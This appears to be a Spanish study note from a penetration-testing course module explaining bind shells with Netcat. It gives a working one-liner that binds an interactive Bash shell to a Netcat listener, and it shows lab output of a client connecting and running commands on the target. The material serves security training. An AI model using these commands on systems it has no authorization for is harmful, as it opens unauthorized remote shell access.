En muchos casos, trabajaremos para establecer un shell en un sistema en una red local o remota. Esto significa que buscaremos utilizar la aplicación de emulador de terminal en nuestro cuadro de ataque local para controlar el sistema remoto a través de su shell. Esto generalmente se hace usando un `Bind` &/o `Reverse` caparazón.

## ¿Qué es?
En un Bind Shell, el sistema  `objetivo`  tiene un oyente iniciado y espera una conexión desde el sistema de un pentester (caja de ataque).

![Image|700x400](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

Puede haber muchos desafíos asociados con la obtención de un caparazón de esta manera.
- Tendría que haber un oyente ya iniciado en el objetivo.
- Si no hay ningún oyente iniciado, necesitaríamos encontrar una manera de que esto suceda.
- Los administradores normalmente configuran reglas estrictas de firewall entrante y NAT (con implementación de PAT) en el borde de la red (de cara al público), por lo que ya necesitaríamos estar en la red interna.
- Los cortafuegos del sistema operativo (en Windows y Linux) probablemente bloquearán la mayoría de las conexiones entrantes que no estén asociadas con aplicaciones de red confiables.

Los firewalls del sistema operativo pueden ser problemáticos al establecer un shell, ya que debemos considerar las direcciones IP, los puertos y la herramienta en uso para que nuestra conexión funcione correctamente. En el ejemplo anterior, la aplicación utilizada para iniciar el oyente se llama [GNU Netcat](https://en.wikipedia.org/wiki/Netcat) . `Netcat` ( `nc`) es considerado nuestro `Swiss-Army Knife`ya que puede funcionar sobre sockets TCP, UDP y Unix. Es capaz de usar IPv4 e IPv6, abrir y escuchar en sockets, operar como proxy e incluso manejar la entrada y salida de texto. Usaríamos nc en el cuadro de ataque como nuestro `client`, y el objetivo sería el `server`.

## Practicando con GNU Netcat
#### No. 1: Servidor - Objetivo que inicia el oyente Netcat
```js
Target@server:~$ nc -lvnp 7777
```

#### No. 2: Cliente - Kali que se conecta al objetivo
```js
p314d0@htb[/htb]$ nc -nv 10.129.41.200 7777
```

Sepa que este no es un caparazón adecuado. Es solo una sesión TCP de Netcat que hemos establecido. Podemos ver su funcionalidad escribiendo un mensaje simple en el lado del cliente y viéndolo recibido en el lado del servidor.


## Estableciendo un Bind Shell básico con Netcat
Hemos demostrado que podemos usar Netcat para enviar texto entre el cliente y el servidor, pero este no es un shell de enlace porque no podemos interactuar con el sistema operativo y el sistema de archivos. En el lado del servidor, necesitaremos especificar el `directory`, `shell`, `listener`, trabajar con algunos `pipelines`, y `input` & `output` `redirection` para garantizar que se proporcione un shell al sistema cuando el cliente intente conectarse.

#### No. 1: Servidor: vincular un shell Bash a la sesión TCP
```js
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l VICTIM_IP 7777 > /tmp/f
```

#### No. 2: Cliente: Conexión para vincular el shell en el objetivo
```js
nc -nv VICTIM_IP 7777
```

```js
┌──(pelado㉿kali)-[~/HTB/Academy/ShellsPayloads]
└─$ nc -nv 10.129.201.134 7777
(UNKNOWN) [10.129.201.134] 7777 (?) open
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb-student@ubuntu:~$ whoami
whoami
htb-student
htb-student@ubuntu:~$ 
```


